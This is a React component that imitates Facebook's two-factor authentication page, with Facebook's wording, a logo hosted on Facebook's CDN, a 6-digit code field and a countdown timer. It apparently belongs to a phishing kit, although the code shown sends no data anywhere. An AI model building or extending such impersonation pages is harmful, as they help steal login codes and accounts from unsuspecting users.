import React, { useEffect, useState } from "react";
import './style.css';
import TextArea from "antd/es/input/TextArea";
import { Button } from "antd";

const Confirm = () => {

  const [time, setTime] = useState(300); // Thời gian ban đầu là 5 phút (300 giây)
  const [isTimeUp, setIsTimeUp] = useState(false);
  useEffect(() => {
    const timer = setInterval(() => {
      setTime((prevTime) => {
        if (prevTime === 0) {
          clearInterval(timer); // Dừng đếm ngược khi hết thời gian
          setIsTimeUp(true);
          return 0;
        }
        return prevTime - 1; // Giảm thời gian mỗi giây
      });
    }, 1000); // Mỗi giây

    return () => clearInterval(timer); // Clear interval khi component unmount
  }, []);
  const formatTime = (seconds: any) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    const formattedMinutes = String(minutes).padStart(2, '0');
    const formattedSeconds = String(remainingSeconds).padStart(2, '0');
    return `${formattedMinutes}:${formattedSeconds}`;
  };
  return (
    <div className="container">
      <div className="header">
        <div className="logo" >
          <a href="##">
            <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F" alt="" />
          </a>
        </div>
      </div>
      <div className="content">
        <div className="form">
          <div className="title">Two-factor authentication required (1/3)</div>
          <div className="text_content">
            <p style={{ marginTop: '16px' }}>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
            <p style={{ marginTop: '20px', marginBottom: '24px' }}>Enter the 6-digit code from your code generator or third-party app below.</p>
            <TextArea style={{ width: '26%' }} placeholder="Enter code" autoSize /> {isTimeUp ? (<a href="##" style={{ marginLeft: "10px", textDecoration: 'none', color: "#385898" }}>Send code</a>) : (<span style={{ marginLeft: "10px" }}>(wait: {formatTime(time)})</span>)}
          </div>
          <div className="footer_form">Need another way to authenticate?
            <Button className="submit"  >
              <p >Send</p>
            </Button>
          </div>
        </div>

      </div>

    </div>


  );

};

export default Confirm;
